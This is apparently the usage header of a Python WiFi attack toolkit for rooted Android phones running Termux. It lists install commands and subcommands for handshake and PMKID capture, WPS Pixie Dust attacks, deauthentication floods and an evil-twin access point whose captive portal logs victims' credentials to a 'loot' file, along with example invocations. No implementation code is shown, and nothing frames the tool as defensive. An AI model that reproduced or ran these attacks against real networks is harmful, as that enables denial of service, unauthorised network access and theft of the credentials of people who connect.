# android_wifi.py — WiFi toolkit that runs ON Android (Termux)

Installs needed on the Android device (Termux):
  pkg install python aircrack-ng hcxtools hostapd dnsmasq tcpdump termux-tools
  # root required for monitor mode, raw sockets, hostapd, iptables

Run:
  python3 android_wifi.py <subcommand> [options]

Subcommands (not limited to brute force):
  scan            scan for networks (airodump-ng or termux-wifi-scan)
  monitor         toggle monitor mode on the interface
  handshake       capture WPA 4-way handshake (+ deauth to force reauth)
  pmkid           PMKID capture — no handshake, no client needed
  wps             WPS Pixie Dust / offline PIN attack (wash + reaver)
  deauth          deauthentication / disassociation flood
  evil-twin       rogue AP + captive portal (logs credentials to android_work/loot/creds.txt)
  capture         general 802.11 packet capture to pcap

Examples:
  python3 android_wifi.py monitor -i wlan0
  python3 android_wifi.py scan -i wlan0mon
  python3 android_wifi.py handshake -i wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6
  python3 android_wifi.py pmkid -i wlan0mon
  python3 android_wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF
  python3 android_wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF --client FF:FF:FF:FF:FF:FF
  python3 android_wifi.py evil-twin -i wlan0 --ssid Free_WiFi --channel 6 --uplink eth0
  python3 android_wifi.py capture -i wlan0mon

Notes:
  - PMKID and handshake captures land in android_work/captures/ — convert .cap with hcxpcapngtool.
  - evil-twin captive portal posts credentials to android_work/loot/creds.txt.
  - Root is required for monitor mode, packet injection, hostapd, and iptables NAT.
  - stdlib only — no pip packages required.
